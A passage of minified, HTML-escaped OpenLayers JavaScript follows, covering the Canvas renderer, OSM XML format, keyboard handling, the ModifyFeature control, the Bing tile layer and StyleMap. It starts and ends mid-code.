h=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[0]];null==h&amp;&amp;(h=-0.5);g=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[1]];null==g&amp;&amp;(g=-0.5);d=this.canvas.mozMeasureText("xx");c[1]+=d*(1+g*f);for(g=0;g&lt;f;g++)&#123;var k=c[0]+h*this.canvas.mozMeasureText(e[g]),l=c[1]+g*d;this.canvas.translate(k,l);this.canvas.mozDrawText(e[g]);this.canvas.translate(-k,-l)&#125;&#125;this.setCanvasStyle("reset")&#125;,getLocalXY:function(a)&#123;var b=this.getResolution(),c=this.extent;return[(a.x-this.featureDx)/b+-c.left/b,c.top/b-a.y/b]&#125;,clear:function()&#123;var a=this.root.height,b=this.root.width;this.canvas.clearRect(0,0,b,a);this.features=&#123;&#125;;this.hitDetection&amp;&amp;this.hitContext.clearRect(0,0,b,a)&#125;,getFeatureIdFromEvent:function(a)&#123;var b;if(this.hitDetection&amp;&amp;"none"!==this.root.style.display&amp;&amp;!this.map.dragging&amp;&amp;(a=a.xy,a=this.hitContext.getImageData(a.x|0,a.y|0,1,1).data,255===a[3]&amp;&amp;(a=a[2]+256*(a[1]+256*a[0]))))&#123;a="OpenLayers_Feature_Vector_"+(a-1+this.hitOverflow);try&#123;b=this.features[a][0]&#125;catch(c)&#123;&#125;&#125;return b&#125;,eraseFeatures:function(a)&#123;OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0;b&lt;a.length;++b)delete this.features[a[b].id];this.redraw()&#125;,redraw:function()&#123;if(!this.locked)&#123;var a=this.root.height,b=this.root.width;this.canvas.clearRect(0,0,b,a);this.hitDetection&amp;&amp;this.hitContext.clearRect(0,0,b,a);var a=[],c,d,e=this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;this.map.getMaxExtent(),f;for(f in this.features)this.features.hasOwnProperty(f)&amp;&amp;(b=this.features[f][0],c=b.geometry,this.calculateFeatureDx(c.getBounds(),e),d=this.features[f][1],this.drawGeometry(c,d,b.id),d.label&amp;&amp;a.push([b,d]));b=0;for(c=a.length;b&lt;c;++b)f=a[b],this.drawText(f[0].geometry.getCentroid(),f[1])&#125;&#125;,CLASS_NAME:"OpenLayers.Renderer.Canvas"&#125;);OpenLayers.Renderer.Canvas.LABEL_ALIGN=&#123;l:"left",r:"right",t:"top",b:"bottom"&#125;;OpenLayers.Renderer.Canvas.LABEL_FACTOR=&#123;l:0,r:-1,t:0,b:-1&#125;;OpenLayers.Renderer.Canvas.drawImageScaleFactor=null;OpenLayers.Format.OSM=OpenLayers.Class(OpenLayers.Format.XML,&#123;checkTags:!1,interestingTagsExclude:null,areaTags:null,initialize:function(a)&#123;var b=&#123;interestingTagsExclude:"source source_ref source:ref history attribution created_by".split(" "),areaTags:"area building leisure tourism ruins historic landuse military natural sport".split(" ")&#125;,b=OpenLayers.Util.extend(b,a),c=&#123;&#125;;for(a=0;a&lt;b.interestingTagsExclude.length;a++)c[b.interestingTagsExclude[a]]=!0;b.interestingTagsExclude=c;c=&#123;&#125;;for(a=0;a&lt;b.areaTags.length;a++)c[b.areaTags[a]]=!0;b.areaTags=c;this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this,[b])&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=this.getNodes(a),c=this.getWays(a);a=Array(c.length);for(var d=0;d&lt;c.length;d++)&#123;for(var e=Array(c[d].nodes.length),f=this.isWayArea(c[d])?1:0,g=0;g&lt;c[d].nodes.length;g++)&#123;var h=b[c[d].nodes[g]],k=new OpenLayers.Geometry.Point(h.lon,h.lat);k.osm_id=parseInt(c[d].nodes[g]);e[g]=k;h.used=!0&#125;h=null;h=f?new OpenLayers.Geometry.Polygon(new OpenLayers.Geometry.LinearRing(e)):new OpenLayers.Geometry.LineString(e);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;h.transform(this.externalProjection,this.internalProjection);e=new OpenLayers.Feature.Vector(h,c[d].tags);e.osm_id=parseInt(c[d].id);e.fid="way."+e.osm_id;a[d]=e&#125;for(var l in b)&#123;h=b[l];if(!h.used||this.checkTags)&#123;c=null;if(this.checkTags)&#123;c=this.getTags(h.node,!0);if(h.used&amp;&amp;!c[1])continue;c=c[0]&#125;else c=this.getTags(h.node);e=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(h.lon,h.lat),c);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.geometry.transform(this.externalProjection,this.internalProjection);e.osm_id=parseInt(l);e.fid="node."+e.osm_id;a.push(e)&#125;h.node=null&#125;return a&#125;,getNodes:function(a)&#123;a=a.getElementsByTagName("node");for(var b=&#123;&#125;,c=0;c&lt;a.length;c++)&#123;var d=a[c],e=d.getAttribute("id");b[e]=&#123;lat:d.getAttribute("lat"),lon:d.getAttribute("lon"),node:d&#125;&#125;return b&#125;,getWays:function(a)&#123;a=a.getElementsByTagName("way");for(var b=[],c=0;c&lt;a.length;c++)&#123;var d=a[c],e=&#123;id:d.getAttribute("id")&#125;;e.tags=this.getTags(d);d=d.getElementsByTagName("nd");e.nodes=Array(d.length);for(var f=0;f&lt;d.length;f++)e.nodes[f]=d[f].getAttribute("ref");b.push(e)&#125;return b&#125;,getTags:function(a,b)&#123;for(var c=a.getElementsByTagName("tag"),d=&#123;&#125;,e=!1,f=0;f&lt;c.length;f++)&#123;var g=c[f].getAttribute("k");d[g]=c[f].getAttribute("v");b&amp;&amp;(this.interestingTagsExclude[g]||(e=!0))&#125;return b?[d,e]:d&#125;,isWayArea:function(a)&#123;var b=!1,c=!1;a.nodes[0]==a.nodes[a.nodes.length-1]&amp;&amp;(b=!0);if(this.checkTags)for(var d in a.tags)if(this.areaTags[d])&#123;c=!0;break&#125;return b&amp;&amp;(this.checkTags?c:!0)&#125;,write:function(a)&#123;OpenLayers.Util.isArray(a)||(a=[a]);this.osm_id=1;this.created_nodes=&#123;&#125;;var b=this.createElementNS(null,"osm");b.setAttribute("version","0.5");b.setAttribute("generator","OpenLayers "+OpenLayers.VERSION_NUMBER);for(var c=a.length-1;0&lt;=c;c--)for(var d=this.createFeatureNodes(a[c]),e=0;e&lt;d.length;e++)b.appendChild(d[e]);return OpenLayers.Format.XML.prototype.write.apply(this,[b])&#125;,createFeatureNodes:function(a)&#123;var b=[],c=a.geometry.CLASS_NAME,c=c.substring(c.lastIndexOf(".")+1),c=c.toLowerCase();(c=this.createXML[c])&amp;&amp;(b=c.apply(this,[a]));return b&#125;,createXML:&#123;point:function(a)&#123;var b=null,c=a.geometry?a.geometry:a;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(c=c.clone(),c.transform(this.internalProjection,this.externalProjection));var d=!1;a.osm_id?(b=a.osm_id,this.created_nodes[b]&amp;&amp;(d=!0)):(b=-this.osm_id,this.osm_id++);var e=d?this.created_nodes[b]:this.createElementNS(null,"node");this.created_nodes[b]=e;e.setAttribute("id",b);e.setAttribute("lon",c.x);e.setAttribute("lat",c.y);a.attributes&amp;&amp;this.serializeTags(a,e);this.setState(a,e);return d?[]:[e]&#125;,linestring:function(a)&#123;var b,c=[],d=a.geometry;a.osm_id?b=a.osm_id:(b=-this.osm_id,this.osm_id++);var e=this.createElementNS(null,"way");e.setAttribute("id",b);for(b=0;b&lt;d.components.length;b++)&#123;var f=this.createXML.point.apply(this,[d.components[b]]);if(f.length)&#123;var f=f[0],g=f.getAttribute("id");c.push(f)&#125;else g=d.components[b].osm_id,f=this.created_nodes[g];this.setState(a,f);f=this.createElementNS(null,"nd");f.setAttribute("ref",g);e.appendChild(f)&#125;this.serializeTags(a,e);c.push(e);return c&#125;,polygon:function(a)&#123;var b=OpenLayers.Util.extend(&#123;area:"yes"&#125;,a.attributes),b=new OpenLayers.Feature.Vector(a.geometry.components[0],b);b.osm_id=a.osm_id;return this.createXML.linestring.apply(this,[b])&#125;&#125;,serializeTags:function(a,b)&#123;for(var c in a.attributes)&#123;var d=this.createElementNS(null,"tag");d.setAttribute("k",c);d.setAttribute("v",a.attributes[c]);b.appendChild(d)&#125;&#125;,setState:function(a,b)&#123;if(a.state)&#123;var c=null;switch(a.state)&#123;case OpenLayers.State.UPDATE:case OpenLayers.State.DELETE:c="delete"&#125;c&amp;&amp;b.setAttribute("action",c)&#125;&#125;,CLASS_NAME:"OpenLayers.Format.OSM"&#125;);OpenLayers.Handler.Keyboard=OpenLayers.Class(OpenLayers.Handler,&#123;KEY_EVENTS:["keydown","keyup"],eventListener:null,observeElement:null,initialize:function(a,b,c)&#123;OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.eventListener=OpenLayers.Function.bindAsEventListener(this.handleKeyEvent,this)&#125;,destroy:function()&#123;this.deactivate();this.eventListener=null;OpenLayers.Handler.prototype.destroy.apply(this,arguments)&#125;,activate:function()&#123;if(OpenLayers.Handler.prototype.activate.apply(this,arguments))&#123;this.observeElement=this.observeElement||document;for(var a=0,b=this.KEY_EVENTS.length;a&lt;b;a++)OpenLayers.Event.observe(this.observeElement,this.KEY_EVENTS[a],this.eventListener);return!0&#125;return!1&#125;,deactivate:function()&#123;var a=!1;if(OpenLayers.Handler.prototype.deactivate.apply(this,arguments))&#123;for(var a=0,b=this.KEY_EVENTS.length;a&lt;b;a++)OpenLayers.Event.stopObserving(this.observeElement,this.KEY_EVENTS[a],this.eventListener);a=!0&#125;return a&#125;,handleKeyEvent:function(a)&#123;this.checkModifiers(a)&amp;&amp;this.callback(a.type,[a])&#125;,CLASS_NAME:"OpenLayers.Handler.Keyboard"&#125;);OpenLayers.Control.ModifyFeature=OpenLayers.Class(OpenLayers.Control,&#123;documentDrag:!1,geometryTypes:null,clickout:!0,toggle:!0,standalone:!1,layer:null,feature:null,vertex:null,vertices:null,virtualVertices:null,handlers:null,deleteCodes:null,virtualStyle:null,vertexRenderIntent:null,mode:null,createVertices:!0,modified:!1,radiusHandle:null,dragHandle:null,onModificationStart:function()&#123;&#125;,onModification:function()&#123;&#125;,onModificationEnd:function()&#123;&#125;,initialize:function(a,b)&#123;b=b||&#123;&#125;;this.layer=a;this.vertices=[];this.virtualVertices=[];this.virtualStyle=OpenLayers.Util.extend(&#123;&#125;,this.layer.style||this.layer.styleMap.createSymbolizer(null,b.vertexRenderIntent));this.virtualStyle.fillOpacity=0.3;this.virtualStyle.strokeOpacity=0.3;this.deleteCodes=[46,68];this.mode=OpenLayers.Control.ModifyFeature.RESHAPE;OpenLayers.Control.prototype.initialize.apply(this,[b]);OpenLayers.Util.isArray(this.deleteCodes)||(this.deleteCodes=[this.deleteCodes]);var c=&#123;documentDrag:this.documentDrag,stopDown:!1&#125;;this.handlers=&#123;keyboard:new OpenLayers.Handler.Keyboard(this,&#123;keydown:this.handleKeypress&#125;),drag:new OpenLayers.Handler.Drag(this,&#123;down:function(a)&#123;this.vertex=null;(a=this.layer.getFeatureFromEvent(this.handlers.drag.evt))?this.dragStart(a):this.clickout&amp;&amp;(this._unselect=this.feature)&#125;,move:function(a)&#123;delete this._unselect;this.vertex&amp;&amp;this.dragVertex(this.vertex,a)&#125;,up:function()&#123;this.handlers.drag.stopDown=!1;this._unselect&amp;&amp;(this.unselectFeature(this._unselect),delete this._unselect)&#125;,done:function(a)&#123;this.vertex&amp;&amp;this.dragComplete(this.vertex)&#125;&#125;,c)&#125;&#125;,destroy:function()&#123;this.map&amp;&amp;this.map.events.un(&#123;removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this&#125;);this.layer=null;OpenLayers.Control.prototype.destroy.apply(this,[])&#125;,activate:function()&#123;this.moveLayerToTop();this.map.events.on(&#123;removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this&#125;);return this.handlers.keyboard.activate()&amp;&amp;this.handlers.drag.activate()&amp;&amp;OpenLayers.Control.prototype.activate.apply(this,arguments)&#125;,deactivate:function()&#123;var a=!1;OpenLayers.Control.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.moveLayerBack(),this.map.events.un(&#123;removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this&#125;),this.layer.removeFeatures(this.vertices,&#123;silent:!0&#125;),this.layer.removeFeatures(this.virtualVertices,&#123;silent:!0&#125;),this.vertices=[],this.handlers.drag.deactivate(),this.handlers.keyboard.deactivate(),(a=this.feature)&amp;&amp;(a.geometry&amp;&amp;a.layer)&amp;&amp;this.unselectFeature(a),a=!0);return a&#125;,beforeSelectFeature:function(a)&#123;return this.layer.events.triggerEvent("beforefeaturemodified",&#123;feature:a&#125;)&#125;,selectFeature:function(a)&#123;if(!(this.feature===a||this.geometryTypes&amp;&amp;-1==OpenLayers.Util.indexOf(this.geometryTypes,a.geometry.CLASS_NAME)))&#123;!1!==this.beforeSelectFeature(a)&amp;&amp;(this.feature&amp;&amp;this.unselectFeature(this.feature),this.feature=a,this.layer.selectedFeatures.push(a),this.layer.drawFeature(a,"select"),this.modified=!1,this.resetVertices(),this.onModificationStart(this.feature));var b=a.modified;!a.geometry||b&amp;&amp;b.geometry||(this._originalGeometry=a.geometry.clone())&#125;&#125;,unselectFeature:function(a)&#123;this.layer.removeFeatures(this.vertices,&#123;silent:!0&#125;);this.vertices=[];this.layer.destroyFeatures(this.virtualVertices,&#123;silent:!0&#125;);this.virtualVertices=[];this.dragHandle&amp;&amp;(this.layer.destroyFeatures([this.dragHandle],&#123;silent:!0&#125;),delete this.dragHandle);this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],&#123;silent:!0&#125;),delete this.radiusHandle);this.layer.drawFeature(this.feature,"default");this.feature=null;OpenLayers.Util.removeItem(this.layer.selectedFeatures,a);this.onModificationEnd(a);this.layer.events.triggerEvent("afterfeaturemodified",&#123;feature:a,modified:this.modified&#125;);this.modified=!1&#125;,dragStart:function(a)&#123;var b="OpenLayers.Geometry.Point"==a.geometry.CLASS_NAME;this.standalone||(a._sketch||!b)&amp;&amp;a._sketch||(this.toggle&amp;&amp;this.feature===a&amp;&amp;(this._unselect=a),this.selectFeature(a));if(a._sketch||b)this.vertex=a,this.handlers.drag.stopDown=!0&#125;,dragVertex:function(a,b)&#123;var c=this.map.getLonLatFromViewPortPx(b),d=a.geometry;d.move(c.lon-d.x,c.lat-d.y);this.modified=!0;"OpenLayers.Geometry.Point"==this.feature.geometry.CLASS_NAME?this.layer.events.triggerEvent("vertexmodified",&#123;vertex:a.geometry,feature:this.feature,pixel:b&#125;):(a._index?(a.geometry.parent.addComponent(a.geometry,a._index),delete a._index,OpenLayers.Util.removeItem(this.virtualVertices,a),this.vertices.push(a)):a==this.dragHandle?(this.layer.removeFeatures(this.vertices,&#123;silent:!0&#125;),this.vertices=[],this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],&#123;silent:!0&#125;),this.radiusHandle=null)):a!==this.radiusHandle&amp;&amp;this.layer.events.triggerEvent("vertexmodified",&#123;vertex:a.geometry,feature:this.feature,pixel:b&#125;),0&lt;this.virtualVertices.length&amp;&amp;(this.layer.destroyFeatures(this.virtualVertices,&#123;silent:!0&#125;),this.virtualVertices=[]),this.layer.drawFeature(this.feature,this.standalone?void 0:"select"));this.layer.drawFeature(a)&#125;,dragComplete:function(a)&#123;this.resetVertices();this.setFeatureState();this.onModification(this.feature);this.layer.events.triggerEvent("featuremodified",&#123;feature:this.feature&#125;)&#125;,setFeatureState:function()&#123;if(this.feature.state!=OpenLayers.State.INSERT&amp;&amp;this.feature.state!=OpenLayers.State.DELETE&amp;&amp;(this.feature.state=OpenLayers.State.UPDATE,this.modified&amp;&amp;this._originalGeometry))&#123;var a=this.feature;a.modified=OpenLayers.Util.extend(a.modified,&#123;geometry:this._originalGeometry&#125;);delete this._originalGeometry&#125;&#125;,resetVertices:function()&#123;0&lt;this.vertices.length&amp;&amp;(this.layer.removeFeatures(this.vertices,&#123;silent:!0&#125;),this.vertices=[]);0&lt;this.virtualVertices.length&amp;&amp;(this.layer.removeFeatures(this.virtualVertices,&#123;silent:!0&#125;),this.virtualVertices=[]);this.dragHandle&amp;&amp;(this.layer.destroyFeatures([this.dragHandle],&#123;silent:!0&#125;),this.dragHandle=null);this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],&#123;silent:!0&#125;),this.radiusHandle=null);this.feature&amp;&amp;"OpenLayers.Geometry.Point"!=this.feature.geometry.CLASS_NAME&amp;&amp;(this.mode&amp;OpenLayers.Control.ModifyFeature.DRAG&amp;&amp;this.collectDragHandle(),this.mode&amp;(OpenLayers.Control.ModifyFeature.ROTATE|OpenLayers.Control.ModifyFeature.RESIZE)&amp;&amp;this.collectRadiusHandle(),this.mode&amp;OpenLayers.Control.ModifyFeature.RESHAPE&amp;&amp;(this.mode&amp;OpenLayers.Control.ModifyFeature.RESIZE||this.collectVertices()))&#125;,handleKeypress:function(a)&#123;var b=a.keyCode;this.feature&amp;&amp;-1!=OpenLayers.Util.indexOf(this.deleteCodes,b)&amp;&amp;(b=this.layer.getFeatureFromEvent(this.handlers.drag.evt))&amp;&amp;(-1!=OpenLayers.Util.indexOf(this.vertices,b)&amp;&amp;!this.handlers.drag.dragging&amp;&amp;b.geometry.parent)&amp;&amp;(b.geometry.parent.removeComponent(b.geometry),this.layer.events.triggerEvent("vertexremoved",&#123;vertex:b.geometry,feature:this.feature,pixel:a.xy&#125;),this.layer.drawFeature(this.feature,this.standalone?void 0:"select"),this.modified=!0,this.resetVertices(),this.setFeatureState(),this.onModification(this.feature),this.layer.events.triggerEvent("featuremodified",&#123;feature:this.feature&#125;))&#125;,collectVertices:function()&#123;function a(c)&#123;var d,e,f;if("OpenLayers.Geometry.Point"==c.CLASS_NAME)e=new OpenLayers.Feature.Vector(c),e._sketch=!0,e.renderIntent=b.vertexRenderIntent,b.vertices.push(e);else&#123;f=c.components.length;"OpenLayers.Geometry.LinearRing"==c.CLASS_NAME&amp;&amp;(f-=1);for(d=0;d&lt;f;++d)e=c.components[d],"OpenLayers.Geometry.Point"==e.CLASS_NAME?(e=new OpenLayers.Feature.Vector(e),e._sketch=!0,e.renderIntent=b.vertexRenderIntent,b.vertices.push(e)):a(e);if(b.createVertices&amp;&amp;"OpenLayers.Geometry.MultiPoint"!=c.CLASS_NAME)for(d=0,f=c.components.length;d&lt;f-1;++d)&#123;e=c.components[d];var g=c.components[d+1];"OpenLayers.Geometry.Point"==e.CLASS_NAME&amp;&amp;"OpenLayers.Geometry.Point"==g.CLASS_NAME&amp;&amp;(e=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point((e.x+g.x)/2,(e.y+g.y)/2),null,b.virtualStyle),e.geometry.parent=c,e._index=d+1,e._sketch=!0,b.virtualVertices.push(e))&#125;&#125;&#125;this.vertices=[];this.virtualVertices=[];var b=this;a.call(this,this.feature.geometry);this.layer.addFeatures(this.virtualVertices,&#123;silent:!0&#125;);this.layer.addFeatures(this.vertices,&#123;silent:!0&#125;)&#125;,collectDragHandle:function()&#123;var a=this.feature.geometry,b=a.getBounds().getCenterLonLat(),b=new OpenLayers.Geometry.Point(b.lon,b.lat),c=new OpenLayers.Feature.Vector(b);b.move=function(b,c)&#123;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);a.move(b,c)&#125;;c._sketch=!0;this.dragHandle=c;this.dragHandle.renderIntent=this.vertexRenderIntent;this.layer.addFeatures([this.dragHandle],&#123;silent:!0&#125;)&#125;,collectRadiusHandle:function()&#123;var a=this.feature.geometry,b=a.getBounds(),c=b.getCenterLonLat(),d=new OpenLayers.Geometry.Point(c.lon,c.lat),b=new OpenLayers.Geometry.Point(b.right,b.bottom),c=new OpenLayers.Feature.Vector(b),e=this.mode&amp;OpenLayers.Control.ModifyFeature.RESIZE,f=this.mode&amp;OpenLayers.Control.ModifyFeature.RESHAPE,g=this.mode&amp;OpenLayers.Control.ModifyFeature.ROTATE;b.move=function(b,c)&#123;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);var l=this.x-d.x,m=this.y-d.y,n=l-b,p=m-c;if(g)&#123;var q=Math.atan2(p,n),q=Math.atan2(m,l)-q,q=q*(180/Math.PI);a.rotate(q,d)&#125;if(e)&#123;var r;f?(m/=p,r=l/n/m):(n=Math.sqrt(n*n+p*p),m=Math.sqrt(l*l+m*m)/n);a.resize(m,d,r)&#125;&#125;;c._sketch=!0;this.radiusHandle=c;this.radiusHandle.renderIntent=this.vertexRenderIntent;this.layer.addFeatures([this.radiusHandle],&#123;silent:!0&#125;)&#125;,setMap:function(a)&#123;this.handlers.drag.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)&#125;,handleMapEvents:function(a)&#123;"removelayer"!=a.type&amp;&amp;"order"!=a.property||this.moveLayerToTop()&#125;,moveLayerToTop:function()&#123;var a=Math.max(this.map.Z_INDEX_BASE.Feature-1,this.layer.getZIndex())+1;this.layer.setZIndex(a)&#125;,moveLayerBack:function()&#123;var a=this.layer.getZIndex()-1;a&gt;=this.map.Z_INDEX_BASE.Feature?this.layer.setZIndex(a):this.map.setLayerZIndex(this.layer,this.map.getLayerIndex(this.layer))&#125;,CLASS_NAME:"OpenLayers.Control.ModifyFeature"&#125;);OpenLayers.Control.ModifyFeature.RESHAPE=1;OpenLayers.Control.ModifyFeature.RESIZE=2;OpenLayers.Control.ModifyFeature.ROTATE=4;OpenLayers.Control.ModifyFeature.DRAG=8;OpenLayers.Layer.Bing=OpenLayers.Class(OpenLayers.Layer.XYZ,&#123;key:null,serverResolutions:[156543.03390625,78271.516953125,39135.7584765625,19567.87923828125,9783.939619140625,4891.9698095703125,2445.9849047851562,1222.9924523925781,611.4962261962891,305.74811309814453,152.87405654907226,76.43702827453613,38.218514137268066,19.109257068634033,9.554628534317017,4.777314267158508,2.388657133579254,1.194328566789627,0.5971642833948135,0.29858214169740677,0.14929107084870338,0.07464553542435169],attributionTemplate:'&lt;span class="olBingAttribution $&#123;type&#125;"&gt;&lt;div&gt;&lt;a target="_blank" href="http://www.bing.com/maps/"&gt;&lt;img src="$&#123;logo&#125;" /&gt;&lt;/a&gt;&lt;/div&gt;$&#123;copyrights&#125;&lt;a style="white-space: nowrap" target="_blank" href="http://www.microsoft.com/maps/product/terms.html"&gt;Terms of Use&lt;/a&gt;&lt;/span&gt;',metadata:null,protocolRegex:/^http:/i,type:"Road",culture:"en-US",metadataParams:null,tileOptions:null,protocol:~window.location.href.indexOf("http")?"":"http:",initialize:function(a)&#123;a=OpenLayers.Util.applyDefaults(&#123;sphericalMercator:!0&#125;,a);OpenLayers.Layer.XYZ.prototype.initialize.apply(this,[a.name||"Bing "+(a.type||this.type),null,a]);this.tileOptions=OpenLayers.Util.extend(&#123;crossOriginKeyword:"anonymous"&#125;,this.options.tileOptions);this.loadMetadata()&#125;,loadMetadata:function()&#123;this._callbackId="_callback_"+this.id.replace(/\./g,"_");window[this._callbackId]=OpenLayers.Function.bind(OpenLayers.Layer.Bing.processMetadata,this);var a=OpenLayers.Util.applyDefaults(&#123;key:this.key,jsonp:this._callbackId,include:"ImageryProviders"&#125;,this.metadataParams),a=this.protocol+"//dev.virtualearth.net/REST/v1/Imagery/Metadata/"+this.type+"?"+OpenLayers.Util.getParameterString(a),b=document.createElement("script");b.type="text/javascript";b.src=a;b.id=this._callbackId;document.getElementsByTagName("head")[0].appendChild(b)&#125;,initLayer:function()&#123;var a=this.metadata.resourceSets[0].resources[0],b=a.imageUrl.replace("&#123;quadkey&#125;","$&#123;quadkey&#125;"),b=b.replace("&#123;culture&#125;",this.culture),b=b.replace(this.protocolRegex,this.protocol);this.url=[];for(var c=0;c&lt;a.imageUrlSubdomains.length;++c)this.url.push(b.replace("&#123;subdomain&#125;",a.imageUrlSubdomains[c]));this.addOptions(&#123;maxResolution:Math.min(this.serverResolutions[a.zoomMin],this.maxResolution||Number.POSITIVE_INFINITY),numZoomLevels:Math.min(a.zoomMax+1-a.zoomMin,this.numZoomLevels)&#125;,!0);this.isBaseLayer||this.redraw();this.updateAttribution()&#125;,getURL:function(a)&#123;if(this.url)&#123;var b=this.getXYZ(a);a=b.x;for(var c=b.y,b=b.z,d=[],e=b;0&lt;e;--e)&#123;var f="0",g=1&lt;&lt;e-1;0!=(a&amp;g)&amp;&amp;f++;0!=(c&amp;g)&amp;&amp;(f++,f++);d.push(f)&#125;d=d.join("");a=this.selectUrl(""+a+c+b,this.url);return OpenLayers.String.format(a,&#123;quadkey:d&#125;)&#125;&#125;,updateAttribution:function()&#123;var a=this.metadata;if(a.resourceSets&amp;&amp;this.map&amp;&amp;this.map.center)&#123;var b=a.resourceSets[0].resources[0],c=this.map.getExtent().transform(this.map.getProjectionObject(),new OpenLayers.Projection("EPSG:4326")),d=b.imageryProviders||[],e=OpenLayers.Util.indexOf(this.serverResolutions,this.getServerResolution()),b="",f,g,h,k,l,m,n;g=0;for(h=d.length;g&lt;h;++g)for(f=d[g],k=0,l=f.coverageAreas.length;k&lt;l;++k)n=f.coverageAreas[k],m=OpenLayers.Bounds.fromArray(n.bbox,!0),c.intersectsBounds(m)&amp;&amp;(e&lt;=n.zoomMax&amp;&amp;e&gt;=n.zoomMin)&amp;&amp;(b+=f.attribution+" ");a=a.brandLogoUri.replace(this.protocolRegex,this.protocol);this.attribution=OpenLayers.String.format(this.attributionTemplate,&#123;type:this.type.toLowerCase(),logo:a,copyrights:b&#125;);this.map&amp;&amp;this.map.events.triggerEvent("changelayer",&#123;layer:this,property:"attribution"&#125;)&#125;&#125;,setMap:function()&#123;OpenLayers.Layer.XYZ.prototype.setMap.apply(this,arguments);this.map.events.register("moveend",this,this.updateAttribution)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.Bing(this.options));return a=OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])&#125;,destroy:function()&#123;this.map&amp;&amp;this.map.events.unregister("moveend",this,this.updateAttribution);OpenLayers.Layer.XYZ.prototype.destroy.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Layer.Bing"&#125;);OpenLayers.Layer.Bing.processMetadata=function(a)&#123;this.metadata=a;this.initLayer();a=document.getElementById(this._callbackId);a.parentNode.removeChild(a);window[this._callbackId]=void 0;delete this._callbackId&#125;;OpenLayers.StyleMap=OpenLayers.Class(&#123;styles:null,extendDefault:!0,initialize:function(a,b)&#123;this.styles=&#123;"default":new OpenLayers.Style(OpenLayers.Feature.Vector.style["default"]),select:new OpenLayers.Style(OpenLayers.Feature.Vector.style.select),temporary:new OpenLayers.Style(OpenLayers.Feature.Vector.style.temporary),"delete":new OpenLayers.Style(OpenLayers.Feature.Vector.style["delete"])&#125;;if(a instanceof OpenLayers.Style)this.styles["default"]=a,this.styles.select=a,this.styles.temporary=a,this.styles["delete"]=a;else if("object"==typeof a)for(var c in a)if(a[c]instanceof OpenLayers.Style)this.styles[c]=a[c];else if("object"==typeof a[c])this.styles[c]=new OpenLayers.Style(a[c]);else&#123;this.styles["default"]=new OpenLayers.Style(a);this.styles.select=new OpenLayers.Style(a);this.styles.temporary=new OpenLayers.Style(a);this.styles["delete"]=new OpenLayers.Style(a);break&#125;OpenLayers.Util.extend(this,b)&#125;,destroy:function()&#123;for(var a in this.styles)this.styles[a].destroy();this.styles=null&#125;,createSymbolizer:function(a,b)&#123;a||(a=new OpenLayers.Feature.Vector);this.styles[b]||(b="default");a.renderIntent=b;var c=&#123;&#125;;this.extendDefault&amp;&amp;"default"!=b&amp;&amp;(c=this.styles["default"].createSymbolizer(a));return OpenLayers.Util.extend(c,this.styles[b].createSymbolizer(a))&#125;,addUniqueValueRules:function(a,b,c,d)&#123;var e=[],f;for(f in c)e.push(new OpenLayers.Rule(&#123;symbolizer:c[f],context:d,filter:new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.EQUAL_TO,property:b,value:f&#125;)&#125;));this.styles[a].addRules(e)&#125;,CLASS_NAME:"OpenLayers.StyleMap"&#125;);OpenLayers.Layer.Vector=OpenLayers.Class(OpenLayers.Layer,&#123;isBaseLayer:!1,isFixed:!1,features:null,filter:null,selectedFeatures:null,unrenderedFeatures:null,reportError:!0,style:null,styleMap:null,strategies:null,protocol:null,renderers:["SVG","VML","Canvas"],renderer:null,rendererOptions:null,geometryType:null,drawn:!1,ratio:1,initialize:function(a,b)&#123;OpenLayers.Layer.prototype.initialize.apply(this,arguments);this.renderer&amp;&amp;this.renderer.supported()||this.assignRenderer();this.renderer&amp;&amp;this.renderer.supported()||(this.renderer=null,this.displayError());this.styleMap||(this.styleMap=new OpenLayers.StyleMap);this.features=[];this.selectedFeatures=[];this.unrenderedFeatures=&#123;&#125;;if(this.strategies)for(var c=0,d=this.strategies.length;c&lt;d;c++)this.strategies[c].setLayer(this)&#125;,destroy:function()&#123;if(this.strategies)&#123;var a,b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoDestroy&amp;&amp;a.destroy();this.strategies=null&#125;this.protocol&amp;&amp;(this.protocol.autoDestroy&amp;&amp;this.protocol.destroy(),this.protocol=null);this.destroyFeatures();this.unrenderedFeatures=this.selectedFeatures=this.features=null;this.renderer&amp;&amp;this.renderer.destroy();this.drawn=this.geometryType=this.renderer=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.Vector(this.name,this.getOptions()));a=OpenLayers.Layer.prototype.clone.apply(this,[a]);for(var b=this.features,c=b.length,d=Array(c),e=0;e&lt;c;++e)d[e]=b[e].clone();a.features=d;return a&#125;,refresh:function(a)&#123;this.calculateInRange()&amp;&amp;this.visibility&amp;&amp;this.events.triggerEvent("refresh",a)&#125;,assignRenderer:function()&#123;for(var 